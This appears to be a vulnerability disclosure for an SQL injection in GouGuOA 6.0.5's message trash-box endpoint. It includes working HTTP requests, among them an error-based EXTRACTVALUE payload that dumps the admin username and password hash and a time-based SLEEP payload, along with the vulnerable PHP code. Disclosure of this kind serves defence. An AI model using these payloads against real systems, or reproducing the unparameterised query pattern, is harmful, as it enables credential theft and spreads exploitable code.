# GouGuOA 6.0.5 SQL Injection Vulnerability Report

## Introduction to Vulnerabilities

The message trash-box endpoint `/home/message/rubbish` in GouGuOA (勾股OA, ThinkPHP 8.1.x-based office automation) concatenates the `keywords` parameter into a raw `WHERE` clause (`title like '%<keywords>%'`) and executes it via `Db::query()` without parameter binding. Any **logged-in user** (the `message` controller is whitelisted in `$not_check`) can run SQL: error-based `EXTRACTVALUE` dumps the full `oa_admin` credentials (username / pwd hash / salt), and time-based `SLEEP` blind injection works even with `APP_DEBUG` off.

## Affected Versions

- GouGuOA `<= 6.0.5` (verified on `6.0.5`, `public/index.php:12` `CMS_VERSION`)

## Utilize conditions

1. Any logged-in account (login open by default; no menu/permission points — `message` is in `$not_check`, `app/base/BaseController.php:115`)

### Step 1 — Login

![image-20260826153008606](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826153008606.wjaqaq7q2.webp)

```
POST /home/login/login_submit HTTP/1.1
Host: 127.0.0.1:8002
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin123&captcha=32
```

![image-20260826153139839](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826153139839.99u3c8dytx.webp)

Response (login success; a think-captcha is normally required — obtained from `/captcha`, the vulnerability is independent of it):

```json
{"code":0,"msg":"登录成功","action":"","url":"","data":{"uid":1}}
```

### Step 2 — Baseline

```
GET /home/message/rubbish?keywords=test&limit=10 HTTP/1.1
Host: 127.0.0.1:8002
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=edaa29cd2c7cc17dfe61b5b91dd0eb14

HTTP/1.1 200 OK
{"code":0,"msg":"","totalRow":[],"count":0,"data":[]}
```

![image-20260826153830721](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826153830721.1e9cevs7uc.webp)

### Step 3 — Error-based injection: dump administrator credentials

Payload closes the `LIKE '%...%'` literal and evaluates `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ...)))` for each scanned row; the XPATH error echoes the sub-query result on the 500 exception page:

```
GET /home/message/rubbish?keywords=%25%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28SELECT%20CONCAT%28username%2C0x3a%2Cpwd%29%20FROM%20oa_admin%20WHERE%20id%3D1%29%29%29%20AND%20%27%25%27%3D%27&limit=10 HTTP/1.1
Cookie: PHPSESSID=61668faa6361c6d398c15a95bb0380f1
```

Response:

![image-20260826153941129](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826153941129.1764jg6dhn.webp)

```
HTTP/1.1 500
<h1>SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~admin:35c1dd9d073ad55ae5ec88297'</h1>
```

### Step 4 — Time-based blind confirmation

```
GET /home/message/rubbish?keywords=%25%27%20AND%20SLEEP%282%29%20AND%20%27%25%27%3D%27&limit=10 HTTP/1.1
```

Response: **16.10s** (baseline ~0.1s) — blind injection holds regardless of `APP_DEBUG`.

![image-20260826154044659](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826154044659.7w7k873ssi.webp)

## Root Cause Analysis

`app/home/controller/Message.php:211-212` — `keywords` taken raw by `get_params()` (= `Request::param()`, `app/common.php:154`, unfiltered) and concatenated into SQL:

```php
if (!empty($param['keywords'])) {
    $where.= " AND title like '%" . $param['keywords'] . "%'";
}
```

The same `$where` builds two `SELECT COUNT(*)` queries and two `UNION ALL`-joined `SELECT` queries, then executes them all via `Db::query()` (`Message.php:223-229`, `:244-247`, `:258`):

```php
$sqlPart  = "SELECT id,title,from_uid,send_time,'{$table}' as table_name FROM {$tableName} WHERE {$wherea}";
$sqlCount = "SELECT COUNT(*) AS count FROM {$tableName} WHERE {$wherea}";
...
$count = Db::query($sql)[0]['count'];
...
$finalSql = $unionSql . " ORDER BY send_time DESC LIMIT {$offset}, {$pageSize}";
$result = Db::query($finalSql);
```

![image-20260827092751754](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260827092751754.2vfhgmx90s.webp)

Notes on technique:

- The count queries execute **before** the final query and share the same payload, so a plain `UNION SELECT` fails with column-count mismatch (1 vs 5) — error-based and time-based injection are the effective vectors (the injected expression runs per scanned row).
- `limit` is guarded by `$offset = ($page-1) * $pageSize` (`Message.php:252`) — non-numeric input dies in PHP, so `keywords` is the only vector.
- Empty tables evaluate no WHERE rows — `oa_message`/`oa_msg` must contain data (always true in production).
- No privilege check applies: `app/base/BaseController.php:115-119`:

```php
$not_check=['index','note','news','regulation','leaves','outs','overtimes','trips','message'];
if ($this->module == 'home' && in_array($this->controller, $not_check)) {
    return true;
}
```
